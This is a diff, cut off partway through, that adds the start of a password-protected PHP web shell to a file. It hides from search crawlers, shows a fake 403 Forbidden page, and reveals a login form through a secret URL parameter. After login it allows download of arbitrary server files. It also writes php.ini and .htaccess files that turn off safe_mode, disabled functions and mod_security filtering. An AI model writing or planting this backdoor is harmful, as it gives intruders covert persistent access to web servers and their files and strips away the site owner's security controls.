@@ -1,8 +1,88 @@
-<?php
 
+<?php
+session_start();
 error_reporting(0);
 set_time_limit(0);
-
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+$auth_pass = "055b22b561dbfbf41004cff4f439bf36"; // pass : Triyel
+$errorforbidden = $_SERVER['REQUEST_URI'];
+$color = "#00ff00";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+ 
+function login_shell() {
+?>
+<?php
+$errorforbidden = $_SERVER['REQUEST_URI'];
+?>
+<html><head>
+<title>403 Forbidden (hahahahha)</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access <?php print $errorforbidden; ?>
+ on this server.</p>
+<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
+</body></html>
+<?php
+if($_GET['030404'] == 'login')
+{
+echo '<br><br><br><br><br><center><form method="post"><input type="password" name="pass"><button>Hai Sir</button></form></center>';
+}
+?>
+<?php
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+    @ob_clean();
+    $file = $_GET['file'];
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
+    exit;
+}
+?>
+<?php
+if (file_exists("php.ini")){
+}else{
+$img = fopen('php.ini', 'w');
+$sec = "safe_mode = OFF
+disable_funtions = NONE";
+fwrite($img ,$sec);
+fclose($img);}
+if (file_exists(".htaccess")){
+}else{
+$img2 = fopen('.htaccess', 'w');
+$sec2 = "<IfModule mod_security.c>
+                SecFilterEngine Off
+                SecFilterScanPOST Off
+                </IfModule>";
+fwrite($img2 ,$sec2);
+fclose($img2);}
+$inids = @ini_get("disable_functions");
+$liatds = (!empty($ds)) ? "<font color='purple'>$inids</font>" : "<font color='white'>Aman cuk :v</font></b>";
 if(get_magic_quotes_gpc()){
 foreach($_POST as $key=>$value){
 $_POST[$key] = stripslashes($value);
